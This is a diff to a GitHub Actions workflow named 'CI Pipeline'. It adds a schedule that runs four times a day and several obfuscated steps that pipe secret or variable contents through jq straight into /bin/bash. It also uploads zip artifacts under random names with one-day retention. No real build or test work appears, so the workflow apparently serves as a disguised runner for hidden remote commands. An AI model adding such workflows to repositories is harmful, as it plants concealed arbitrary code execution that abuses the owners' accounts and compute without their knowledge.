@@ -2,6 +2,8 @@ name: CI Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '39 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,15 +18,21 @@ jobs:
           fetch-depth: 1
       - name: Process
         env:
-          dxlg8244: ${{ secrets.dxlg8244 }}
+          nvl973: ${{ secrets.nvl973 }}
         run: |
-          printf '%s' "$dxlg8244" | jq -r .gmx1 | /bin/bash
-          echo $beow88 | jq -r .bh500 | /bin/bash
+          printf '%s' "$nvl973" | jq -r .f9 | /bin/bash
+          echo $hxi691 | jq -r .m359 | /bin/bash
+          printf '%s' "$mu09775" | jq -r .ba10 | /bin/bash
+          echo $zja21223 | jq -r .siiqj8841 | /bin/bash
+          echo $v5750 | jq -r .lajj8 | /bin/bash
+          printf '%s' "$fsqd5464" | jq -r .sq5 | /bin/bash
+          printf '%s' "$z3" | jq -r .yllgp4339 | /bin/bash
+          echo $pj59 | jq -r .flclc6 | /bin/bash
 
       - name: Store results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: VLIe1eqD
+          name: o86KMRTS
           path: "*.zip"
           retention-days: 1
